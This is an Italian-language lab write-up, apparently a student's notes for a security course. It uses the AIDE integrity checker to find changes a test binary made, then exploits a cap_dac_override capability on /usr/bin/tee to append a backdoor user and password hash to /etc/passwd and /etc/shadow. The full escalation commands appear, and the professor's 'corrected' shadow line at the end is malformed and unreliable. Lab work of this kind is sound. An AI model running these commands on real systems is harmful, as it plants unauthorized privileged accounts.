@@ -1,0 +1,56 @@
+
+Per identificare le modifiche apportate dal file change4 viene utilizzato l'integrity checker AIDE:
+
+	1 Viene modificato il file di configurazione aide.conf indicando le directory /usr/bin e /etc per poterne effettuare il controllo
+
+	2 Inizializzo il database con il comando: 
+sudo aide -c /home/kali/aide/aide.conf -i
+
+	3 Copio quindi il nuovo database:
+sudo cp /home/kali/aide/aide.db{.new,}
+
+	4 Aggiungo il permesso di esecuzione al file change4 con il comando:
+chmod +x ./change4
+
+	5 Eseguo il file con i privilegi di root con il comando: 
+sudo ./change4
+
+	6 Effettuo quindi il controllo integrità con il comando:
+sudo aide -c /home/kali/aide/aide.db -C
+
+Il risultato del controllo mostra come il file change4 abbia apportato modifiche ai file:
+/etc/sudoers (ACL)
+/usr/bin/grep (capabilities)
+/usr/bin/tee (capabilities)
+/usr/bin/vim.tiny (rimozione del diritto di scrittura per l'utente)
+
+Una verifica puntuale sui quattro file mostra che in tre casi su quattro le modifiche non sono visibili o non consentono abusi. L'unico file utilizzabile è /usr/bin/tee dotato della cap_dac_override
+
+-------------------------------------------------------------------------//
+NB: CAP_DAC_OVERRIDE è una delle capability di Linux, che rappresenta un meccanismo fine-grained di gestione dei permessi. Invece di assegnare privilegi elevati attraverso l'assegnazione del ruolo di superutente (root), le capability permettono di assegnare singoli privilegi specifici alle applicazioni o ai processi. Questa capability in questione, consente ad un processo di bypassare i controlli DAC (Discretionary Access Control) sui permessi di file.
+-------------------------------------------------------------------------//
+
+Sfrutto le modifiche apportate al file /usr/bin/tee per poter aggiungere al file passwd con il comando: 
+echo "hack:x:10000:1:hack:/home/hack:/bin/bash" | tee -a /etc/passwd
+
+Per impostare la password "hack" occorre codificarla con l'aggiunta di un salt e poi inserirla nel file /etc/shadow:
+
+	1 eseguo, per generare il salt: 
+openssl rand -base64 32
+
+	2 eseguo per codificare la password "hack" con il salt precedentemente calcolato:
+openssl passwd -6 -salt mqn8xWt4j5pjMVxh66RmfPWQtLrrVphcI8aXI/iNzoY= hack
+
+	3 eseguo per aggiungere la password al file /etc/shadow:
+echo "hack:$6$mqn8xWt4j5pjMVxh$7jvaiqFpR3uJPox0muNyShei.4kUFE0atuNKdw4YpkSXYu2FNqCxqFg0RJdMnbmCHbjQmqf0BCPdE4..NNLJs.:::::::" | tee -a /etc/shadow
+
+NB: SE NON FUNZIONA ALLORA LEGGE MALE IL $ E BISOGNA METTERE UN \
+
+	4 eseguo su hack e alla richiesta inserisco la password "hack"
+
+	5 Lancio il comando id
+
+
+-----------
+NB: al punto 3. il prof dice che il comando dovrebbe essere:
+echo "hack:mqn8xWt4j5pjMVxh66RmfPWQtLrrVphcI8aXI/iNzoY= hack $6$mqn8xWt4j5pjMVxh$7jvaiqFpR3uJPox0muNyShei.4kUFE0atuNKdw4YpkSXYu2FNqCxqFg0RJdMnbmCHbjQmqf0BCPdE4..NNLJs.:::::::" | tee -a /etc/shadow
